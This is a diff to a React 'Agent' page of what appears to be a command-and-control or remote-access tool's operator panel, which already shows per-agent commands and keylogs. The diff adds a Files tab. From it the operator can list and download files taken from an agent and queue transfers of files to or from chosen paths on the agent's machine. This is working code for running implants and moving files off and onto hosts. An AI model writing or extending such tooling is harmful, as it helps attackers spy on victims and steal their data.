@@ -35,6 +35,14 @@ const Agent = () => {
   const [newKey, setNewKey] = useState('');
   const [newValue, setNewValue] = useState('');
 
+  // States related to Files tab
+  const [files, setFiles] = useState([]);
+  const [fileUploadPath, setFileUploadPath] = useState('');
+  const [fileToUpload, setFileToUpload] = useState(null);
+  const [uploadError, setUploadError] = useState(null);
+  const fileInputRef = useRef(null);
+  
+
   const getQueryParam = (param) => {
     const searchParams = new URLSearchParams(location.search);
     return searchParams.get(param);
@@ -49,6 +57,7 @@ const Agent = () => {
       const queryParam = getQueryParam('agt');
       const agentResponse = await axios.get(`/api/agent/${queryParam}`);
       const commandsResponse = await axios.get(`/api/commands/${queryParam}`);
+      const filesResponse = await axios.get(`/api/files/list/${queryParam}`);
       const keylogsResponse = await axios.get(`/api/keylog/${queryParam}`);
       const notesResponse = await axios.get(`/api/notes/${queryParam}`);
       const tagsResponse = await axios.get(`/api/tags/${queryParam}`);
@@ -70,6 +79,11 @@ const Agent = () => {
       } else {
         setCommands([]);
       }
+      if (filesResponse.data.data){
+        setFiles(filesResponse.data.data)
+      } else {
+        setFiles([])
+      }
       if (keylogsResponse.data.data) {
         setKeylogs(keylogsResponse.data.data);
       } else {
@@ -89,6 +103,63 @@ const Agent = () => {
       setError(err.message);
     }
   };
+  
+  const handleDownloadFile = async (fileId) => {
+    try {
+      const response = await axios.get(`/api/files/download/${fileId}`, {
+        responseType: 'blob',
+      });
+  
+      const contentDisposition = response.headers['content-disposition'];
+      let filename = 'file';
+  
+      if (contentDisposition && contentDisposition.indexOf('attachment') !== -1) {
+        const filenameMatch = contentDisposition.match(/filename=["']?([^"']+)["']?/);
+        if (filenameMatch && filenameMatch[1]) {
+          filename = filenameMatch[1];
+        }
+      }
+  
+      const url = window.URL.createObjectURL(new Blob([response.data]));
+      const link = document.createElement('a');
+      link.href = url;
+      link.setAttribute('download', filename);
+      document.body.appendChild(link);
+      link.click();
+    } catch (err) {
+      console.error('Failed to download file:', err);
+    }
+  };
+  
+  const handleFileTransferRequest = async () => {
+    try {
+      const formData = new FormData();
+      
+      const transfertype = fileToUpload ? 'Download' : 'Upload';
+      
+      if (fileToUpload) {
+        formData.append('file', fileToUpload);
+      }
+      
+      formData.append('path', fileUploadPath);
+      formData.append('uuid', getQueryParam('agt'));
+      formData.append('transfertype', transfertype);
+  
+      await axios.post('/api/files/upload', formData, {
+        headers: { 'Content-Type': 'multipart/form-data' },
+      });
+  
+      if (fileInputRef.current) {
+        fileInputRef.current.value = ''; 
+      }
+  
+    } catch (err) {
+      setUploadError('Failed to upload file');
+    }
+    setFileUploadPath('');
+    setFileToUpload(null);
+  };
+  
 
   useEffect(() => {
     fetchData();
@@ -188,6 +259,59 @@ const Agent = () => {
       </div>
     </div>
   );
+
+  const renderFilesTab = () => {
+    return (
+      <div>
+        <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
+          <table>
+            <thead>
+              <tr>
+                <th>File Path</th>
+                <th>Status</th>
+                <th>Action</th>
+              </tr>
+            </thead>
+            <tbody>
+              {files.map((file) => (
+                <tr key={file.FileID}>
+                  <td>{file.Path}</td>
+                  <td>{file.Status}</td>
+                  <td>
+                    <button onClick={() => handleDownloadFile(file.FileID)}>
+                      Download
+                    </button>
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+        <h3>File Transfers</h3>
+        <form onSubmit={(e) => { e.preventDefault(); handleFileTransferRequest(); }}>
+          <div>
+            <label>Path: </label>
+            <input
+              type="text"
+              value={fileUploadPath}
+              onChange={(e) => setFileUploadPath(e.target.value)}
+              required
+            />
+          </div>
+          <div>
+            <label>File: </label>
+            <input
+              type="file"
+              onChange={(e) => setFileToUpload(e.target.files[0])}
+              ref={fileInputRef}
+            />
+          </div>
+          <button type="submit">Request Transfer</button>
+        </form>
+        {uploadError && <p className="error">{uploadError}</p>}
+      </div>
+    );
+  };
 
   const handleSaveNotes = async () => {
     try {
@@ -326,13 +450,13 @@ const Agent = () => {
   const renderTagsTab = () => {
     return (
       <div>
-      <div style={{ maxHeight: '300px', overflowY: 'auto' }}> {/* Set your desired height */}
+      <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
         <table>
           <thead>
             <tr>
               <th>Key</th>
               <th>Value</th>
-              <th>Action</th> {/* Added a header for actions */}
+              <th>Action</th>
             </tr>
           </thead>
           <tbody>
@@ -341,7 +465,7 @@ const Agent = () => {
                 <td>{tag.key}</td>
                 <td>{tag.value || 'N/A'}</td>
                 <td>
-                  <button onClick={() => handleDeleteTag(tag.tagid)}>Delete</button> {/* Delete button */}
+                  <button onClick={() => handleDeleteTag(tag.tagid)}>Delete</button>
                 </td>
               </tr>
             ))}
@@ -402,6 +526,12 @@ const Agent = () => {
             Commands
           </button>
           <button
+            className={activeTab === 'files' ? 'active' : ''}
+            onClick={() => setActiveTab('files')}
+          >
+            Files
+          </button>
+          <button
             className={activeTab === 'keys' ? 'active' : ''}
             onClick={() => setActiveTab('keys')}
           >
@@ -429,6 +559,7 @@ const Agent = () => {
         {/* Tab content */}
         <div className="tab-content">
           {activeTab === 'commands' && renderCommandsTab()}
+          {activeTab === 'files' && renderFilesTab()}
           {activeTab === 'keys' && renderKeylogsTab()}
           {activeTab === 'configuration' && renderConfigurationTab()}
           {activeTab === 'notes' && renderNotesTab()}
